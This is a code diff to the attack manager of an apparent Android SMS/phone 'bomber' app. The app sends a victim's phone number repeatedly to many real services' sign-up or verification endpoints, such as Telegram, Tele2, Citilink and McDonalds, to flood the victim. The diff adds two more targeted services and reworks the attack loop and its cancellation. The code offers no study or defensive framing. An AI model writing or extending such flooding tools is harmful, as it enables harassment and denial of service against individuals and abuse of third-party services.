@@ -6,6 +6,7 @@ import com.dm.bomber.services.Alltime;
 import com.dm.bomber.services.AtPrime;
 import com.dm.bomber.services.CarSmile;
 import com.dm.bomber.services.Citilink;
+import com.dm.bomber.services.Eldorado;
 import com.dm.bomber.services.GloriaJeans;
 import com.dm.bomber.services.ICQ;
 import com.dm.bomber.services.Kari;
@@ -17,6 +18,7 @@ import com.dm.bomber.services.Service;
 import com.dm.bomber.services.Sravni;
 import com.dm.bomber.services.SushiWok;
 import com.dm.bomber.services.Tele2;
+import com.dm.bomber.services.Tele2TV;
 import com.dm.bomber.services.Telegram;
 import com.dm.bomber.services.YandexEda;
 
@@ -55,7 +57,7 @@ public class AttackManager {
                 new Alltime(), new Mcdonalds(), new Telegram(),
                 new AtPrime(), new MTS(), new CarSmile(),
                 new Sravni(), new OK(), new SushiWok(),
-                new Tele2()
+                new Tele2(), new Eldorado(), new Tele2TV()
         };
     }
 
@@ -70,10 +72,6 @@ public class AttackManager {
 
     public void stopAttack() {
         attack._stop();
-    }
-
-    public int getServicesCount() {
-        return this.services.length;
     }
 
     public List<Service> getUsableServices(String phoneCode) {
@@ -101,11 +99,8 @@ public class AttackManager {
         private final int numberOfCycles;
 
         private int progress = 0;
-        private boolean status = true;
 
         private CountDownLatch tasks;
-
-        private List<Service> usableServices;
 
         public Attack(String phoneCode, String phone, int cycles) {
             super(phone);
@@ -116,12 +111,16 @@ public class AttackManager {
         }
 
         public void _stop() {
-            status = false;
+            interrupt();
+
+            for (Call call : client.dispatcher().runningCalls()) {
+                call.cancel();
+            }
         }
 
         @Override
         public void run() {
-            usableServices = getUsableServices(phoneCode);
+            List<Service> usableServices = getUsableServices(phoneCode);
 
             callback.onAttackStart(usableServices.size(), numberOfCycles);
 
@@ -130,7 +129,8 @@ public class AttackManager {
 
                 for (Service service : usableServices) {
                     service.prepare(phoneCode, phone);
-                    service.call(client, new Callback() {
+
+                    client.newCall(service.run()).enqueue(new Callback() {
                         @Override
                         public void onFailure(@NotNull Call call, @NotNull IOException e) {
                             progress++;
@@ -140,27 +140,23 @@ public class AttackManager {
                         }
 
                         @Override
-                        public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
+                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                             if (!response.isSuccessful()) {
                                 Log.i(TAG, service.getClass().getName() + "  returned an error HTTP code: " + response.code());
                             }
-                            progress++;
 
+                            progress++;
                             tasks.countDown();
+
                             callback.onProgressChange(progress);
                         }
                     });
-
-                    if (!status) {
-                        callback.onAttackEnd();
-                        return;
-                    }
                 }
 
                 try {
                     tasks.await();
                 } catch (InterruptedException e) {
-                    e.printStackTrace();
+                    break;
                 }
             }
 
